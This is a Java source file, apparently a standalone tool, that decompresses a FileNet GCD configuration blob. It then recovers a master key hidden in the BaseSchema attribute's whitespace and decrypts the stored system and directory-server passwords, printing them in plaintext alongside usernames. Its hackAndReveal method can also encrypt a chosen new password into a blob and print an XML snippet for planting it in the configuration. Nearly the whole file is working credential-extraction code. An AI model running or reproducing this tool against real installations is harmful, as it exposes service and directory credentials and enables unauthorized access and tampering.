package xyz.doejack.filenet;

import java.io.*;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.zip.InflaterInputStream;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class GCDConfigImpl implements GCDConfig {

  private FileInputStream fileInputStream;
  private ByteArrayOutputStream bufferStream;
  private FileOutputStream fileOutputStream;
  private SequenceInputStream sequenceInputStream;
  private InflaterInputStream inflaterInputStream;
  final byte[] array = new byte[16];
  private String xmlContent = null;

  private static final byte[] STATIC_IV = "Mike Seaman OK!!".getBytes(StandardCharsets.US_ASCII);

  GCDConfigImpl(String name) throws IOException {
    try {
      this.fileInputStream = new FileInputStream(name);
      this.fileOutputStream = new FileOutputStream(name + ".gcd.out");
      this.bufferStream = new ByteArrayOutputStream();

      fileInputStream.read(array);
      this.sequenceInputStream =
          new SequenceInputStream(new ByteArrayInputStream(array), this.fileInputStream);
      this.inflaterInputStream = new InflaterInputStream(sequenceInputStream);
    } catch (IOException e) {
      System.out.println(e.getMessage());
      throw e;
    }
  }

  @Override
  public void decode() {
    System.out.println(">>> Decoding BLOB to XML...");
    try {
      int b;
      while ((b = this.inflaterInputStream.read()) != -1) {
        this.fileOutputStream.write(b);
        this.bufferStream.write(b);
      }
      this.xmlContent = this.bufferStream.toString("UTF-8");
      System.out.println(">>> XML Saved to disk.");
    } catch (IOException e) {
      System.err.println(e.getMessage());
    }
  }

  public void hackAndReveal(String newPasswordToEncrypt) {
    if (this.xmlContent == null || this.xmlContent.isEmpty()) {
      System.out.println("Error: XML content is empty. Did decoding fail?");
      return;
    }
    String cryptoAlg = findAttributeValue(xmlContent, "CryptoAlgorithm", "string");
    if (cryptoAlg == null) cryptoAlg = "AES/CBC/PKCS5Padding";
    System.out.println("Crypto Algorithm: " + cryptoAlg);
    String baseSchema = findAttributeValue(xmlContent, "BaseSchema", "string");
    byte[] masterKey = null;
    if (baseSchema != null) {
      try {
        System.out.println("Found BaseSchema...");
        System.out.println("Attempting to extract hidden key...");
        masterKey = deserializeKey(baseSchema);
        System.out.println("MASTER KEY CONTENTS: " + Arrays.toString(masterKey));
        System.out.println("MASTER KEY FOUND (Hex): " + bytesToHex(masterKey));
      } catch (Exception e) {
        System.out.println("Failed to extract key: " + e.getMessage());
      }
    } else {
      System.out.println("CRITICAL: BaseSchema attribute not found! Cannot decrypt.");
      return;
    }

    if (masterKey != null) {
      String username = findAttributeValue(xmlContent, "SystemUsername", "string");
      System.out.println("System User: " + (username != null ? username : "NOT FOUND"));
      decryptAndPrint(xmlContent, "SystemPassword", masterKey, cryptoAlg);
      java.util.List<String> dirUsers =
          findAllAttributeValues(xmlContent, "DirectoryServerUserName", "string");
      java.util.List<String> dirPasses =
          findAllAttributeValues(xmlContent, "DirectoryServerPassword", "blob");
      System.out.println(
          "\n>>> Directory Server credentials: "
              + dirPasses.size()
              + " password(s), "
              + dirUsers.size()
              + " username(s)");

      for (int i = 0; i < dirPasses.size(); i++) {
        String user = (i < dirUsers.size()) ? dirUsers.get(i) : "(no matching username)";
        String pass = decrypt(dirPasses.get(i), masterKey, cryptoAlg);
        System.out.println("  [" + i + "] " + user + " : " + pass);
      }

      if (newPasswordToEncrypt != null && !newPasswordToEncrypt.isEmpty()) {
        System.out.println("\n>>> ENCRYPTING NEW PASSWORD <<<");
        System.out.println("Input: " + newPasswordToEncrypt);
        String newBlob = encrypt(newPasswordToEncrypt, masterKey, cryptoAlg);
        System.out.println("New Encrypted Blob: " + newBlob);
        System.out.println("XML Snippet: <value type=\"2\" blob=\"" + newBlob + "\"/>");
      }
    }
  }

  private java.util.List<String> findAllAttributeValues(String xml, String attrName, String type) {
    java.util.List<String> results = new java.util.ArrayList<>();
    Pattern pAttr =
        Pattern.compile(
            "<attribute[^>]*name=\"" + attrName + "\"[^>]*>.*?<value[^>]*" + type + "=\"([^\"]+)\"",
            Pattern.DOTALL);
    Matcher m = pAttr.matcher(xml);
    while (m.find()) { // loop instead of single find()
      results.add(m.group(1));
    }
    return results;
  }

  private String findAttributeValue(String xml, String attrName, String type) {
    Pattern pAttr =
        Pattern.compile(
            "<attribute[^>]*name=\"" + attrName + "\"[^>]*>.*?<value[^>]*" + type + "=\"([^\"]+)\"",
            Pattern.DOTALL);
    Matcher m = pAttr.matcher(xml);
    if (m.find()) {
      return m.group(1);
    }
    return null;
  }

  private void decryptAndPrint(String xml, String attrName, byte[] key, String algorithm) {
    String hexBlob = findAttributeValue(xml, attrName, "blob");
    if (hexBlob != null) {
      String pass = decrypt(hexBlob, key, algorithm);
      System.out.println(attrName + ": " + pass);
    } else {
      System.out.println(attrName + ": Not found (or not encrypted)");
    }
  }

  private String decrypt(String hexData, byte[] key, String algorithm) {
    try {
      byte[] encrypted = hexStringToByteArray(hexData);
      Cipher cipher = Cipher.getInstance(algorithm);
      SecretKeySpec ks = new SecretKeySpec(key, "AES");
      if (algorithm.indexOf("CBC") != -1) {
        cipher.init(Cipher.DECRYPT_MODE, ks, new IvParameterSpec(STATIC_IV));
      } else {
        cipher.init(Cipher.DECRYPT_MODE, ks);
      }
      return new String(cipher.doFinal(encrypted), StandardCharsets.UTF_8);
    } catch (Exception e) {
      return "Decryption Error: " + e.getMessage();
    }
  }

  private String encrypt(String password, byte[] key, String algorithm) {
    try {
      Cipher cipher = Cipher.getInstance(algorithm);
      SecretKeySpec ks = new SecretKeySpec(key, "AES");
      if (algorithm.indexOf("CBC") != -1) {
        cipher.init(Cipher.ENCRYPT_MODE, ks, new IvParameterSpec(STATIC_IV));
      } else {
        cipher.init(Cipher.ENCRYPT_MODE, ks); // ECB, no IV
      }
      byte[] encrypted = cipher.doFinal(password.getBytes(StandardCharsets.UTF_8));
      return bytesToHex(encrypted);
    } catch (Exception e) {
      return "Encryption Error: " + e.getMessage();
    }
  }

  private byte[] deserializeKey(String source) {
    System.out.println("DEBUG: Source length: " + source.length());
    BitConsumer bc = new BitConsumer();
    int i = 0;
    int n = source.length();
    while (i < n) {
      char c = source.charAt(i++);
      if (c == ' ') {
        if (i < n && source.charAt(i) == ' ') {
          bc.consumeBit(true); // Double space = 1
          i++;
        } else {
          bc.consumeBit(false); // Single space = 0
        }
        continue;
      }
      if (c == '"' || c == '\'') {
        char quote = c; // Skip quoted text
        while (i < n && source.charAt(i) != quote) i++;
        i++;
      }
    }
    return bc.getResult();
  }

  private static class BitConsumer {
    private int position = 0;
    private int truePosition = 0;
    private int currentByteIndex = 0;
    private byte currentByte = 0;
    private int noiseBytes;
    private int resultStartIndex;
    private byte[] result;
    private boolean onesDoubled = true;
    private boolean sizeFound = false;

    void consumeBit(boolean spaceDoubled) {
      if (position == 0) {
        onesDoubled = spaceDoubled;
        position++;
        return;
      }
      if (position % 4 == 3) {
        position++; // Skip parity bit logic
        return;
      }

      int shift = truePosition % 8;
      if (spaceDoubled == onesDoubled) {
        currentByte |= (1 << shift);
      }

      if (shift == 7) { // Byte complete
        int val = currentByte & 0xFF;
        if (currentByteIndex == 0) {
          noiseBytes = val;
          resultStartIndex = 2 + noiseBytes;
        } else if (currentByteIndex >= noiseBytes + 1) {
          if (currentByteIndex == noiseBytes + 1) {
            result = new byte[val];
            sizeFound = true;
          } else if (sizeFound) {
            int idx = currentByteIndex - resultStartIndex;
            if (idx >= 0 && idx < result.length) {
              result[idx] = currentByte;
            }
          }
        }
        currentByteIndex++;
        currentByte = 0;
      }
      position++;
      truePosition++;
    }

    byte[] getResult() {
      return result;
    }
  }

  private static String bytesToHex(byte[] bytes) {
    StringBuilder sb = new StringBuilder();
    for (byte b : bytes) sb.append(String.format("%02x", b));
    return sb.toString();
  }

  public static byte[] hexStringToByteArray(String s) {
    int len = s.length();
    byte[] data = new byte[len / 2];
    for (int i = 0; i < len; i += 2) {
      data[i / 2] =
          (byte) ((Character.digit(s.charAt(i), 16) << 4) + Character.digit(s.charAt(i + 1), 16));
    }
    return data;
  }

  @Override
  public void close() {
    try {
      if (fileInputStream != null) fileInputStream.close();
      if (fileOutputStream != null) fileOutputStream.close();
      if (inflaterInputStream != null) inflaterInputStream.close();
      if (sequenceInputStream != null) sequenceInputStream.close();
    } catch (IOException e) {
      System.err.println(e.getMessage());
    }
  }
}
